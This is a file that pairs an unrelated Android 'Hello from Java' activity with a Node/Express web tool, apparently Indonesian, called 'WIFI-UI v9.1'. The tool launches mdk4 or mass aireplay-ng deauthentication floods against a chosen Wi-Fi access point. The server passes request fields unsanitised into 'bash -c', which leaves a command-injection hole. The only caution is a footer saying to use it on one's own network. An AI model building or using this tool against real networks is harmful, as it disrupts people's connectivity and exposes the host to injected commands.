package com.wifiui;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("Hello from Java!");
        tv.setTextSize(20);
        tv.setPadding(40, 40, 40, 40);
        setContentView(tv);
    }
}
const express = require('express');
const { exec, spawn } = require('child_process');
const app = express();
const PORT = 3000;
app.use(express.json());

let attackProcess = null;
let currentTarget = null;

// ---------- UTILITY ----------
function execP(cmd) {
  return new Promise((resolve, reject) => {
    exec(cmd, (err, stdout) => {
      if (err) reject(err);
      else resolve(stdout.trim());
    });
  });
}

async function checkTools() {
  try {
    await execP('which mdk4');
    return 'mdk4';
  } catch {
    try {
      await execP('which aireplay-ng');
      return 'aireplay';
    } catch {
      return null;
    }
  }
}

// ---------- MDK4 ----------
async function startMdk4(bssid, channel, thread) {
  try { await execP('airmon-ng start wlan0'); } catch (e) {}
  const cmd = `mdk4 wlan0mon d -t ${thread} -c ${channel} -B ${bssid}`;
  const p = spawn('bash', ['-c', cmd]);
  p.stdout.on('data', d => console.log('[mdk4] ' + d));
  p.stderr.on('data', d => console.error('[mdk4 err] ' + d));
  p.on('close', () => { attackProcess = null; currentTarget = null; });
  return p;
}

// ---------- AIREPLAY FALLBACK ----------
async function startAireplay(bssid, channel, thread) {
  try { await execP('airmon-ng start wlan0'); } catch (e) {}
  const instances = Math.min(Math.floor(thread / 100), 20);
  const procs = [];
  for (let i = 0; i < instances; i++) {
    const p = spawn('bash', ['-c', `aireplay-ng -0 0 -a ${bssid} wlan0mon`]);
    procs.push(p);
  }
  const wrapper = {
    kill: (sig) => { procs.forEach(p => p.kill(sig)); },
    on: (ev, cb) => { procs.forEach(p => p.on(ev, cb)); }
  };
  procs.forEach(p => {
    p.on('close', () => {
      procs.forEach(q => { if (q !== p) q.kill('SIGINT'); });
      attackProcess = null;
      currentTarget = null;
    });
  });
  return wrapper;
}

// ---------- ROUTES ----------
app.post('/api/attack', async (req, res) => {
  const { action, bssid, channel, thread } = req.body;
  if (action === 'start') {
    if (attackProcess) return res.json({ status: 'error', message: 'serangan berjalan' });
    const tool = await checkTools();
    if (!tool) return res.json({ status: 'error', message: 'mdk4/aireplay tidak terinstall' });
    try {
      const thr = Math.min(parseInt(thread) || 500, 2000);
      let proc;
      if (tool === 'mdk4') proc = await startMdk4(bssid, channel, thr);
      else proc = await startAireplay(bssid, channel, thr);
      attackProcess = proc;
      currentTarget = { bssid, channel, thread: thr, tool };
      res.json({ status: 'ok', message: `serang ${bssid} (${tool}, thread ${thr})` });
    } catch (e) {
      res.json({ status: 'error', message: e.message });
    }
  } else if (action === 'stop') {
    if (attackProcess) {
      attackProcess.kill('SIGINT');
      attackProcess = null;
      currentTarget = null;
      res.json({ status: 'ok', message: 'dihentikan' });
    } else {
      res.json({ status: 'error', message: 'tidak ada serangan' });
    }
  } else if (action === 'status') {
    if (attackProcess) {
      res.json({ status: 'ok', message: `aktif menyerang ${currentTarget?.bssid || '?'}` });
    } else {
      res.json({ status: 'ok', message: 'idle' });
    }
  } else {
    res.json({ status: 'error', message: 'action tidak dikenal' });
  }
});

// ---------- UI (HTML + CSS + JS) ----------
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>WIFI-UI v9.1</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
  background: #0a0a0a;
  color: #00ff41;
  font-family: 'Courier New', monospace;
  height: 100vh;
  overflow: hidden;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  position: relative;
}
#matrix {
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  z-index: 0;
  pointer-events: none;
  opacity: 0.12;
}
#matrix canvas {
  width: 100%; height: 100%;
}
.container {
  z-index: 1;
  background: rgba(0,0,0,0.88);
  border: 2px solid #00ff41;
  border-radius: 16px;
  padding: 30px 24px;
  max-width: 440px;
  width: 92%;
  box-shadow: 0 0 60px rgba(0,255,65,0.25);
  backdrop-filter: blur(6px);
}
.header {
  text-align: center;
  border-bottom: 1px solid #00ff41;
  padding-bottom: 14px;
  margin-bottom: 22px;
}
.header h1 {
  font-size: 1.8rem;
  letter-spacing: 6px;
  text-shadow: 0 0 20px #00ff41;
  animation: blink 1.2s infinite;
}
.header .sub { font-size: 0.75rem; color: #66ff88; opacity: 0.8; }
.header .version { font-size: 0.6rem; color: #44cc66; opacity: 0.6; }
@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.25;} }
.input-group { margin: 16px 0; }
.input-group label {
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 2px;
  display: block;
  margin-bottom: 5px;
  color: #88ffaa;
}
.input-group input {
  width: 100%;
  padding: 12px 14px;
  background: #111;
  border: 1px solid #00ff41;
  border-radius: 8px;
  color: #00ff41;
  font-family: inherit;
  font-size: 1rem;
  outline: none;
}
.input-group input:focus {
  box-shadow: 0 0 25px #00ff41;
  border-color: #66ff88;
}
.btn {
  width: 100%;
  padding: 14px;
  background: #00ff41;
  color: #0a0a0a;
  border: none;
  border-radius: 8px;
  font-family: inherit;
  font-size: 1.1rem;
  font-weight: bold;
  letter-spacing: 2px;
  cursor: pointer;
  transition: 0.3s;
  text-transform: uppercase;
  margin-top: 8px;
}
.btn:hover { background: #66ff88; box-shadow: 0 0 40px #00ff41; transform: scale(1.02); }
.btn:active { transform: scale(0.96); }
.btn:disabled { opacity: 0.4; pointer-events: none; }
#log {
  margin-top: 18px;
  padding: 12px;
  background: #0d0d0d;
  border: 1px solid #226622;
  border-radius: 8px;
  height: 120px;
  overflow-y: auto;
  font-size: 0.7rem;
  color: #88ff88;
  white-space: pre-wrap;
  word-break: break-all;
  line-height: 1.6;
}
#log::-webkit-scrollbar { width: 4px; background: #111; }
#log::-webkit-scrollbar-thumb { background: #00ff41; }
.status-led {
  display: inline-block;
  width: 12px; height: 12px;
  border-radius: 50%;
  background: #446644;
  margin-right: 6px;
  transition: 0.3s;
  vertical-align: middle;
}
.status-led.active { background: #00ff41; box-shadow: 0 0 20px #00ff41; }
.footer {
  margin-top: 16px;
  text-align: center;
  font-size: 0.55rem;
  color: #446644;
  border-top: 1px solid #1a3a1a;
  padding-top: 12px;
}
@media (max-width: 480px) { .container { padding: 20px 14px; } .header h1 { font-size: 1.4rem; } }
</style>
</head>
<body>
<div id="matrix"><canvas id="matrixCanvas"></canvas></div>
<div class="container">
  <div class="header">
    <h1>⚡ WIFI-UI ⚡</h1>
    <div class="sub">Midnight · Killer Engine</div>
    <div class="version">v9.1 · thread max 2000</div>
  </div>
  <div class="input-group">
    <label><span class="status-led" id="led"></span> TARGET BSSID (MAC AP)</label>
    <input type="text" id="bssid" placeholder="xx:xx:xx:xx:xx:xx" value="00:11:22:33:44:55">
  </div>
  <div class="input-group">
    <label>📡 CHANNEL</label>
    <input type="number" id="channel" placeholder="1-11" value="6">
  </div>
  <div class="input-group">
    <label>🧵 THREAD (max 2000)</label>
    <input type="number" id="thread" placeholder="500" value="1500" min="1" max="2000">
  </div>
  <button class="btn" id="attackBtn">▶ MULAI SERANGAN</button>
  <button class="btn" id="stopBtn" style="background:#441111;color:#ff6666;margin-top:10px;">⏹ HENTIKAN</button>
  <div id="log">[system] WIFI-UI v9.1 siap</div>
  <div class="footer">⚠️ gunakan hanya di jaringan sendiri</div>
</div>
<script>
// ---------- MATRIX ----------
(function() {
  const canvas = document.getElementById('matrixCanvas');
  const ctx = canvas.getContext('2d');
  let w, h, cols, drops = [];
  function resize() {
    w = canvas.width = window.innerWidth;
    h = canvas.height = window.innerHeight;
    cols = Math.floor(w / 20);
    drops = Array(cols).fill(1);
  }
  window.addEventListener('resize', resize);
  resize();
  const chars = '0123456789ABCDEF';
  function draw() {
    ctx.fillStyle = 'rgba(10,10,10,0.05)';
    ctx.fillRect(0, 0, w, h);
    ctx.fillStyle = '#00ff41';
    ctx.font = '16px monospace';
    for (let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * 20, drops[i] * 20);
      if (drops[i] * 20 > h && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    }
    requestAnimationFrame(draw);
  }
  draw();
})();

// ---------- LOGIC ----------
const led = document.getElementById('led');
const logEl = document.getElementById('log');
const bssidInput = document.getElementById('bssid');
const chInput = document.getElementById('channel');
const thInput = document.getElementById('thread');
const attackBtn = document.getElementById('attackBtn');
const stopBtn = document.getElementById('stopBtn');

let isAttacking = false;
let statusInt = null;

function log(msg) {
  const t = new Date().toLocaleTimeString();
  logEl.textContent += '[' + t + '] ' + msg + '\\n';
  logEl.scrollTop = logEl.scrollHeight;
}
function setLed(on) {
  led.className = 'status-led' + (on ? ' active' : '');
}
async function cmd(action, data) {
  try {
    const r = await fetch('/api/attack', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, ...data })
    });
    const j = await r.json();
    if (j.status === 'ok') log('[ok] ' + j.message);
    else log('[err] ' + j.message);
    return j;
  } catch (e) {
    log('[err] ' + e.message);
    return null;
  }
}
attackBtn.onclick = async function() {
  if (isAttacking) return;
  const bssid = bssidInput.value.trim();
  const channel = parseInt(chInput.value) || 6;
  const thread = parseInt(thInput.value) || 500;
  if (thread > 2000) { log('thread max 2000'); return; }
  if (!bssid.match(/^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/)) {
    log('BSSID salah (format xx:xx:xx:xx:xx:xx)');
    return;
  }
  attackBtn.disabled = true;
  log('serang ' + bssid + ' ch' + channel + ' th' + thread);
  setLed(true);
  const result = await cmd('start', { bssid, channel, thread });
  if (result && result.status === 'ok') {
    isAttacking = true;
    log('ATTACK RUNNING');
    statusInt = setInterval(async () => {
      if (!isAttacking) return;
      await cmd('status', {});
    }, 3000);
  } else {
    setLed(false);
    attackBtn.disabled = false;
    log('gagal start');
  }
};
stopBtn.onclick = async function() {
  if (!isAttacking) { log('tidak ada serangan'); return; }
  log('stopping...');
  const result = await cmd('stop', {});
  if (result && result.status === 'ok') {
    isAttacking = false;
    clearInterval(statusInt);
    setLed(false);
    attackBtn.disabled = false;
    log('stopped');
  } else {
    log('gagal stop');
  }
};
setInterval(async () => {
  if (isAttacking) await cmd('status', {});
}, 5000);
log('ready. backend sama dengan UI.');
</script>
</body>
</html>
  `);
});

// ---------- START ----------
app.listen(PORT, () => {
  console.log(`WIFI-UI v9.1 running on http://localhost:${PORT}`);
  console.log('Pastikan mdk4/aireplay & root siap.');
});